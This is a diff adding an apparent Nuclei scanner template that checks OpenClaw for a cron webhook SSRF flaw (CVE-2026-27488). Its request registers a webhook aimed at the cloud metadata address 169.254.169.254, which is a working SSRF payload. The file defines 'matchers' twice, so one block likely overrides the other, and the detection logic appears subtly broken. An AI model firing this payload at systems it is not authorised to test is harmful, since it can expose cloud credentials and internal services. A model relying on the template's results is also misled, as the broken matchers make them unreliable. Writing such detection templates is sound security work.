@@ -1,0 +1,48 @@
+id: cron-webhook-ssrf
+
+info:
+  name: OpenClaw Cron Webhook SSRF (CVE-2026-27488)
+  author: lobster-guard
+  severity: high
+  description: |
+    OpenClaw before 2026.2.19: Cron webhook delivery uses fetch() directly,
+    so webhook targets can reach private/metadata/internal endpoints without
+    SSRF policy checks.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-27488
+    - https://github.com/openclaw/openclaw/commit/99db4d13e5c139883ef0def9ff963e9273179655
+  classification:
+    cvss-score: 7.3
+    cve-id: CVE-2026-27488
+    cwe-id: CWE-918
+  tags: openclaw,cve2026,ssrf,webhook,cron
+
+http:
+  - raw:
+      - |
+        POST /api/cron HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Authorization: Bearer {{token}}
+
+        {"schedule":"* * * * *","webhookUrl":"http://169.254.169.254/latest/meta-data/","name":"ssrf-probe"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      - type: word
+        words:
+          - "created"
+          - "schedule"
+          - "webhook"
+        condition: or
+    matchers:
+      - type: word
+        negative: true
+        words:
+          - "blocked"
+          - "not allowed"
+          - "ssrf"
